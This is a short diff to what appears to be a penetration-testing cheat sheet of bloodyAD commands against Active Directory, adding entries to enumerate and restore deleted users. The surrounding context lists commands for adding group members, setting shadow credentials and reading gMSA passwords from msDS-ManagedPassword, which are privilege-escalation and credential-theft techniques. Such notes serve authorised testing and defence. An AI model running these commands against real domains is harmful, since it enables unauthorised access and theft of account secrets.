@@ -30,6 +30,16 @@ bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add groupMember '
 bloodyAD --host <target> -d <domain>  -u '<user>' -p '<passwd>' add shadowCredentials <target_user>
 ```
 
+## Enum Deleted User
+```
+bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' -k get writable --include-del
+```
+
+## Restore Deleted User
+```
+bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' -k set restore <target_name>
+```
+
 ## ReadGMSAPassword
 ```
 bloodyAD --host <target> -d <domain> -u <user> -p <passwd> get object <target_username> --attr msDS-ManagedPassword
